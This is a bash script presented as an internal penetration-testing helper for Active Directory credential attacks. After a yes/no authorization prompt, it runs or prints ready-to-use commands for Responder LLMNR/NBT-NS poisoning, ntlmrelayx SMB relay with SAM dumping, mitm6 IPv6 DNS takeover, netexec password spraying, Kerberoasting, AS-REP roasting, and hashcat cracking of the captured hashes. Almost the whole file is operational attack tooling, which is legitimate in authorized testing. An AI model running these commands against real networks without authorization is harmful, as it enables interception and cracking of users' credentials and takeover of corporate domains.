#!/bin/bash

#
# Internal Pentest - Credential Attack Setup Script
# Guided setup for Responder, relay attacks, and password spraying
#
# Usage: ./credential-attacks.sh <INTERFACE> <DC_IP> <DOMAIN> [USER] [PASS]
#
# Example: ./credential-attacks.sh eth0 10.0.0.1 corp.local
# Example: ./credential-attacks.sh eth0 10.0.0.1 corp.local jsmith 'P@ssw0rd!'
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Check arguments
if [ "$#" -lt 3 ]; then
    echo -e "${RED}[!] Usage: $0 <INTERFACE> <DC_IP> <DOMAIN> [USER] [PASS]${NC}"
    echo -e "${BLUE}[*] Example: $0 eth0 10.0.0.1 corp.local${NC}"
    echo -e "${BLUE}[*] Example: $0 eth0 10.0.0.1 corp.local jsmith 'P@ssw0rd!'${NC}"
    exit 1
fi

INTERFACE="$1"
DC_IP="$2"
DOMAIN="$3"
USER="${4:-}"
PASS="${5:-}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESPONDER_DIR="../outputs/responder"
IMPACKET_DIR="../outputs/impacket"
NETEXEC_DIR="../outputs/netexec"
TARGETS_DIR="../targets"

echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Internal Pentest - Credential Attacks (Phase 3)           ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
echo -e "${BLUE}[*] Interface: ${INTERFACE}${NC}"
echo -e "${BLUE}[*] DC: ${DC_IP}${NC}"
echo -e "${BLUE}[*] Domain: ${DOMAIN}${NC}"
if [ -n "$USER" ]; then
    echo -e "${BLUE}[*] User: ${USER}${NC}"
fi
echo ""

# Create directories
mkdir -p "$RESPONDER_DIR" "$IMPACKET_DIR" "$NETEXEC_DIR"

# Authorization check
echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║  AUTHORIZATION CHECK                                       ║${NC}"
echo -e "${YELLOW}║                                                            ║${NC}"
echo -e "${YELLOW}║  This script sets up credential attacks including:         ║${NC}"
echo -e "${YELLOW}║  - LLMNR/NBT-NS poisoning (Responder)                    ║${NC}"
echo -e "${YELLOW}║  - SMB relay attacks (ntlmrelayx)                         ║${NC}"
echo -e "${YELLOW}║  - Password spraying                                      ║${NC}"
echo -e "${YELLOW}║  - Kerberos ticket extraction                             ║${NC}"
echo -e "${YELLOW}║                                                            ║${NC}"
echo -e "${YELLOW}║  These are ACTIVE attacks that intercept credentials.     ║${NC}"
echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

read -p "Do you have explicit written authorization for credential attacks? (yes/no): " AUTHORIZED

if [ "$AUTHORIZED" != "yes" ]; then
    echo -e "\n${RED}[!] Credential attacks require explicit authorization.${NC}"
    exit 1
fi

echo -e "\n${GREEN}[+] Authorization confirmed.${NC}\n"

# ============================================================
# MENU
# ============================================================
echo -e "${CYAN}Select attack to configure:${NC}"
echo ""
echo -e "  ${GREEN}1)${NC} Responder (LLMNR/NBT-NS poisoning)"
echo -e "  ${GREEN}2)${NC} SMB Relay (ntlmrelayx)"
echo -e "  ${GREEN}3)${NC} IPv6 DNS Takeover (mitm6 + relay)"
echo -e "  ${GREEN}4)${NC} Password Spray"
echo -e "  ${GREEN}5)${NC} Kerberoasting"
echo -e "  ${GREEN}6)${NC} AS-REP Roasting"
echo -e "  ${GREEN}7)${NC} Show all commands (copy-paste reference)"
echo ""
read -p "Choice [1-7]: " CHOICE

case $CHOICE in
    1)
        echo -e "\n${CYAN}━━━ Responder Setup ━━━${NC}"
        echo -e "${BLUE}[*] Starting Responder on ${INTERFACE}...${NC}"
        echo -e "${YELLOW}[!] Let this run for 30-60+ minutes during business hours${NC}"
        echo -e "${YELLOW}[!] Best times: 9-10am, 1-2pm (login/reconnect activity)${NC}"
        echo -e "${BLUE}[*] Hashes will be saved to: ${RESPONDER_DIR}/${NC}"
        echo -e "${BLUE}[*] Press Ctrl+C to stop${NC}\n"

        sudo responder -I "$INTERFACE" -wrFP -v 2>&1 | tee "${RESPONDER_DIR}/responder_${TIMESTAMP}.log"

        echo -e "\n${GREEN}[+] Responder stopped. Copying hashes...${NC}"
        cp /usr/share/responder/logs/NTLMv2-*.txt "$RESPONDER_DIR/" 2>/dev/null || true
        cp /usr/share/responder/logs/NTLMv1-*.txt "$RESPONDER_DIR/" 2>/dev/null || true

        HASH_COUNT=$(ls -1 ${RESPONDER_DIR}/NTLMv2-*.txt 2>/dev/null | wc -l | tr -d ' ')
        echo -e "${GREEN}[+] Captured ${HASH_COUNT} hash file(s)${NC}"
        echo -e "\n${GREEN}[+] Crack with:${NC}"
        echo -e "  ${CYAN}hashcat -m 5600 ${RESPONDER_DIR}/NTLMv2-*.txt /usr/share/wordlists/rockyou.txt${NC}"
        ;;

    2)
        echo -e "\n${CYAN}━━━ SMB Relay Setup ━━━${NC}"
        if [ ! -f "$TARGETS_DIR/smb-no-signing.txt" ]; then
            echo -e "${RED}[!] No relay targets found at ${TARGETS_DIR}/smb-no-signing.txt${NC}"
            echo -e "${BLUE}[*] Run network-discovery.sh first to identify targets without SMB signing${NC}"
            exit 1
        fi
        RELAY_COUNT=$(wc -l < "$TARGETS_DIR/smb-no-signing.txt" | tr -d ' ')
        echo -e "${BLUE}[*] ${RELAY_COUNT} relay targets loaded from ${TARGETS_DIR}/smb-no-signing.txt${NC}"
        echo -e "${YELLOW}[!] Run Responder in another terminal (option 1) to trigger relays${NC}"
        echo -e "${BLUE}[*] Press Ctrl+C to stop${NC}\n"

        sudo ntlmrelayx.py \
            -tf "$TARGETS_DIR/smb-no-signing.txt" \
            -smb2support \
            --dump-sam \
            -of "${IMPACKET_DIR}/relay_hashes_${TIMESTAMP}.txt" 2>&1 | tee "${IMPACKET_DIR}/relay_${TIMESTAMP}.log"
        ;;

    3)
        echo -e "\n${CYAN}━━━ IPv6 DNS Takeover Setup ━━━${NC}"
        if ! command -v mitm6 &> /dev/null; then
            echo -e "${RED}[!] mitm6 not found. Install with: pip install mitm6${NC}"
            exit 1
        fi
        echo -e "${BLUE}[*] This requires TWO terminals:${NC}"
        echo -e "${YELLOW}Terminal 1 (this window) - mitm6:${NC}"
        echo -e "  ${CYAN}sudo mitm6 -d ${DOMAIN} --ignore-nofqdn${NC}"
        echo -e "${YELLOW}Terminal 2 - ntlmrelayx:${NC}"
        echo -e "  ${CYAN}sudo ntlmrelayx.py -6 -t ldaps://${DC_IP} --delegate-access -wh attacker-wpad${NC}"
        echo ""
        read -p "Start mitm6 now? (yes/no): " START_MITM6
        if [ "$START_MITM6" = "yes" ]; then
            echo -e "${BLUE}[*] Starting mitm6...${NC}"
            echo -e "${YELLOW}[!] Start ntlmrelayx in another terminal!${NC}\n"
            sudo mitm6 -d "$DOMAIN" --ignore-nofqdn 2>&1 | tee "${IMPACKET_DIR}/mitm6_${TIMESTAMP}.log"
        fi
        ;;

    4)
        echo -e "\n${CYAN}━━━ Password Spray Setup ━━━${NC}"
        if [ ! -f "$TARGETS_DIR/domain-users.txt" ]; then
            echo -e "${RED}[!] No user list found at ${TARGETS_DIR}/domain-users.txt${NC}"
            echo -e "${BLUE}[*] Run ad-enum.sh first to extract domain users${NC}"
            exit 1
        fi
        USER_COUNT=$(wc -l < "$TARGETS_DIR/domain-users.txt" | tr -d ' ')
        echo -e "${BLUE}[*] ${USER_COUNT} users loaded from ${TARGETS_DIR}/domain-users.txt${NC}"

        echo -e "\n${MAGENTA}[!] REVIEW PASSWORD POLICY FIRST!${NC}"
        echo -e "${MAGENTA}[!] Check: ${NETEXEC_DIR}/pass_pol_*.txt${NC}"
        echo -e "${MAGENTA}[!] Lockout threshold and observation window are CRITICAL${NC}\n"

        read -p "Enter password to spray (e.g., Spring2026!): " SPRAY_PASS
        echo ""
        echo -e "${BLUE}[*] Spraying '${SPRAY_PASS}' against ${USER_COUNT} users...${NC}"

        netexec smb "$DC_IP" \
            -u "$TARGETS_DIR/domain-users.txt" \
            -p "$SPRAY_PASS" \
            --continue-on-success 2>&1 | tee "${NETEXEC_DIR}/spray_${TIMESTAMP}.txt"

        # Show successes
        echo -e "\n${GREEN}[+] Results:${NC}"
        grep -i "+" "${NETEXEC_DIR}/spray_${TIMESTAMP}.txt" 2>/dev/null || echo "No successful logins"
        ;;

    5)
        echo -e "\n${CYAN}━━━ Kerberoasting ━━━${NC}"
        if [ -z "$USER" ] || [ -z "$PASS" ]; then
            echo -e "${RED}[!] Kerberoasting requires domain credentials${NC}"
            echo -e "${BLUE}[*] Usage: $0 $INTERFACE $DC_IP $DOMAIN <USER> <PASS>${NC}"
            exit 1
        fi
        echo -e "${BLUE}[*] Extracting Kerberos service ticket hashes...${NC}\n"

        impacket-GetUserSPNs \
            -request \
            -dc-ip "$DC_IP" \
            "${DOMAIN}/${USER}:${PASS}" \
            -outputfile "${IMPACKET_DIR}/kerberoast_${TIMESTAMP}.txt" 2>&1 | tee "${IMPACKET_DIR}/kerberoast_log_${TIMESTAMP}.txt"

        if [ -f "${IMPACKET_DIR}/kerberoast_${TIMESTAMP}.txt" ]; then
            HASH_COUNT=$(wc -l < "${IMPACKET_DIR}/kerberoast_${TIMESTAMP}.txt" | tr -d ' ')
            echo -e "\n${GREEN}[+] Extracted ${HASH_COUNT} Kerberoast hash(es)${NC}"
            echo -e "${GREEN}[+] Crack with:${NC}"
            echo -e "  ${CYAN}hashcat -m 13100 ${IMPACKET_DIR}/kerberoast_${TIMESTAMP}.txt /usr/share/wordlists/rockyou.txt${NC}"
        fi
        ;;

    6)
        echo -e "\n${CYAN}━━━ AS-REP Roasting ━━━${NC}"
        if [ ! -f "$TARGETS_DIR/domain-users.txt" ]; then
            echo -e "${RED}[!] No user list found at ${TARGETS_DIR}/domain-users.txt${NC}"
            exit 1
        fi
        echo -e "${BLUE}[*] Checking for AS-REP roastable accounts...${NC}\n"

        impacket-GetNPUsers \
            -dc-ip "$DC_IP" \
            "${DOMAIN}/" \
            -usersfile "$TARGETS_DIR/domain-users.txt" \
            -format hashcat \
            -outputfile "${IMPACKET_DIR}/asrep_${TIMESTAMP}.txt" 2>&1 | tee "${IMPACKET_DIR}/asrep_log_${TIMESTAMP}.txt"

        if [ -f "${IMPACKET_DIR}/asrep_${TIMESTAMP}.txt" ] && [ -s "${IMPACKET_DIR}/asrep_${TIMESTAMP}.txt" ]; then
            HASH_COUNT=$(wc -l < "${IMPACKET_DIR}/asrep_${TIMESTAMP}.txt" | tr -d ' ')
            echo -e "\n${GREEN}[+] Found ${HASH_COUNT} AS-REP roastable account(s)${NC}"
            echo -e "${GREEN}[+] Crack with:${NC}"
            echo -e "  ${CYAN}hashcat -m 18200 ${IMPACKET_DIR}/asrep_${TIMESTAMP}.txt /usr/share/wordlists/rockyou.txt${NC}"
        else
            echo -e "\n${BLUE}[*] No AS-REP roastable accounts found${NC}"
        fi
        ;;

    7)
        echo -e "\n${CYAN}━━━ All Credential Attack Commands ━━━${NC}\n"

        echo -e "${GREEN}# Responder${NC}"
        echo -e "sudo responder -I ${INTERFACE} -wrFP -v | tee ${RESPONDER_DIR}/responder_\$(date +%Y%m%d_%H%M%S).log"
        echo ""

        echo -e "${GREEN}# SMB Relay${NC}"
        echo -e "sudo ntlmrelayx.py -tf ${TARGETS_DIR}/smb-no-signing.txt -smb2support --dump-sam"
        echo ""

        echo -e "${GREEN}# IPv6 DNS Takeover${NC}"
        echo -e "# Terminal 1:"
        echo -e "sudo mitm6 -d ${DOMAIN} --ignore-nofqdn"
        echo -e "# Terminal 2:"
        echo -e "sudo ntlmrelayx.py -6 -t ldaps://${DC_IP} --delegate-access -wh attacker-wpad"
        echo ""

        echo -e "${GREEN}# Password Spray${NC}"
        echo -e "netexec smb ${DC_IP} -u ${TARGETS_DIR}/domain-users.txt -p 'Spring2026!' --continue-on-success"
        echo ""

        if [ -n "$USER" ] && [ -n "$PASS" ]; then
            echo -e "${GREEN}# Kerberoasting${NC}"
            echo -e "impacket-GetUserSPNs -request -dc-ip ${DC_IP} '${DOMAIN}/${USER}:${PASS}' -outputfile ${IMPACKET_DIR}/kerberoast.txt"
            echo ""

            echo -e "${GREEN}# AS-REP Roasting${NC}"
            echo -e "impacket-GetNPUsers -dc-ip ${DC_IP} '${DOMAIN}/' -usersfile ${TARGETS_DIR}/domain-users.txt -format hashcat -outputfile ${IMPACKET_DIR}/asrep.txt"
            echo ""
        fi

        echo -e "${GREEN}# Hash Cracking${NC}"
        echo -e "hashcat -m 5600 ${RESPONDER_DIR}/NTLMv2-*.txt /usr/share/wordlists/rockyou.txt    # NTLMv2"
        echo -e "hashcat -m 13100 ${IMPACKET_DIR}/kerberoast*.txt /usr/share/wordlists/rockyou.txt  # Kerberoast"
        echo -e "hashcat -m 18200 ${IMPACKET_DIR}/asrep*.txt /usr/share/wordlists/rockyou.txt       # AS-REP"
        ;;

    *)
        echo -e "${RED}[!] Invalid choice${NC}"
        exit 1
        ;;
esac
